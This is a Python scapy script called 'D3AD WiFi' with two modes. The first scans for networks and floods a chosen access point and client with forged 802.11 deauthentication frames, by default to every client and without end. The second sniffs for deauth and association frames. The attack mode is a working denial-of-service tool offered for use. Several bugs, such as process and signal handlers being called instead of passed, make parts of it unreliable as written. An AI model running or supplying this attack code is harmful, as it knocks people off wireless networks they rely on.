#!/usr/bin/python3
import signal
from time import sleep as timeout
from scapy.all import *
from pyfiglet import figlet_format
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11, Dot11Deauth, Dot11Elt, Dot11AssoReq, Dot11Auth
from termcolor import colored
from multiprocessing import Process
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import platform
import os
from tqdm import tqdm
from colors import red, green, blue
from time import sleep


def restart_program() :
    python = sys.executable
    os.execl(python, python, *sys.argv)
    a = platform.system()
    if a == 'Windows' :
        print(os.system('cls'))
    elif a == 'Linux' :
        print(os.system('clear'))
    elif a == 'Darwin' :
        print(os.system('clear'))


print(colored(figlet_format("D3AD WiFi"), color="cyan"))
print('=' * 60)
print("\t\tDeveloped By •ArunAppoos  (©) 2020")
print('=' * 60)

print(red("NOTE: Before using this tool, you must enable monitor mode on your wifi adapter."))

option = input("Choose which tool you want to use! \n \t[1] WiFi Deauth Tool \n \t[2] WiFi Deauth Detection Tool \n"
               "\nEnter your choice: ")

if option == "1" :
    a = platform.system()
    if a == 'Windows' :
        print(os.system('cls'))
    elif a == 'Linux' :
        print(os.system('clear'))
    elif a == 'Darwin' :
        print(os.system('clear'))

    print(colored(figlet_format("W!F! Deauth"), color="blue"))


    def add_network(pckt, known_networks) :

        essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[
            Dot11Elt].info != '' else 'Hidden SSID'
        bssid = pckt[Dot11].addr3
        channel = int(ord(pckt[Dot11Elt :3].info))
        if bssid not in known_networks :
            known_networks[bssid] = (essid, channel)
            print("{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid))


    def channel_scan() :

        while True :
            try :
                channel = random.randrange(1, 13)
                os.system("iwconfig %s channel %d" % (interface, channel))
                time.sleep(1)
            except KeyboardInterrupt :
                break


    def stop_channel_scan() :
        global stop_sniff
        stop_sniff = True
        channel_scan.terminate()
        channel_scan.join()


    def keep_sniffing() :
        return stop_sniff


    def perform_deauth(bssid, client, count) :
        pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()

        cli_to_ap_pckt = None

        if client != 'FF:FF:FF:FF:FF:FF' :
            cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
            print('Sending Deauth to ' + client + ' from ' + bssid)

        if not count : print('Press CTRL+C to quit')

        while count != 0 :
            try :
                for i in range(64) :

                    send(pckt)

                    if client != 'FF:FF:FF:FF:FF:FF' : send(cli_to_ap_pckt)

                count = -1
            except KeyboardInterrupt :
                break


    if __name__ == "__main__" :

        interface: str = input("Select the wifi interface(ex.mon0) : ")

        conf.iface = interface
        networks = {}
        stop_sniff = False
        print('>>Press Ctrl+c to stop sniffing!<<')

        bla = blue("Scanning wifi networks")

        for i in tqdm(range(100), desc=bla) :
            sleep(0.1)

        print('=' * 60 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID', 'BSSID') + '=' * 60)
        channel_scan = Process(target=channel_scan(), args=(interface,))
        channel_scan.start()
        signal.signal(signal.SIGINT, stop_channel_scan())

        sniff(lfilter=lambda x : (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=keep_sniffing,
              prn=lambda x : add_network(x, networks))

        signal.signal(signal.SIGINT, signal.SIG_DFL)
        print('=' * 60)
        target_bssid = input('Enter a BSSID to perform  deauth attack (q to quit): ')
        while target_bssid not in networks :
            if target_bssid == 'q' : sys.exit(0)
            input('BSSID not found... Please enter a valid BSSID (q to quit): ')

        print('Changing ' + interface + ' to channel ' + str(networks[target_bssid][1]))
        os.system("iwconfig %s channel %d" % (interface, networks[target_bssid][1]))

        target_client = input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
        if not target_client :
            target_client = 'FF:FF:FF:FF:FF:FF'

        deauth_pckt_count = input('Number of deauth packets (Default: -1 [constant]): ')
        if not deauth_pckt_count :
            deauth_pckt_count = -1

        perform_deauth(target_bssid, target_client, deauth_pckt_count)

if option == "2" :
    a = platform.system()
    if a == 'Windows' :
        print(os.system('cls'))
    elif a == 'Linux' :
        print(os.system('clear'))
    elif a == 'Darwin' :
        print(os.system('clear'))

    print(colored(figlet_format("Deauth Detector"), color="blue"))

    interface = input("Select the wifi interface(ex.mon0) : ")

    def sniffReq(p) :
        if p.haslayer(Dot11Deauth) :

            print(
                p.sprintf("Deauth Found from AP [%Dot11.addr2%] Client [%Dot11.addr1%], Reason [%Dot11Deauth.reason%]"))

        if p.haslayer(Dot11AssoReq) :
            print(
                p.sprintf(
                    "Association request from Station [%Dot11.addr1%], Client [%Dot11.addr2%], AP [%Dot11Elt.info%]"))

            if p.haslayer(Dot11Auth) :
                print(
                    p.sprintf("Authentication Request from [%Dot11.addr1%] to AP [%Dot11.addr2%]"))
                print(
                    p.sprintf(
                        "------------------------------------------------------------------------------------------"))

    sniff(iface=interface, prn=sniffReq)


elif option >= '3' :
    print("Error! Enter a valid option.")
    restart_program()

elif option == '0' :
    print("Error! Enter a valid option.")
    restart_program()

else :
    timeout(3)
    restart_program()
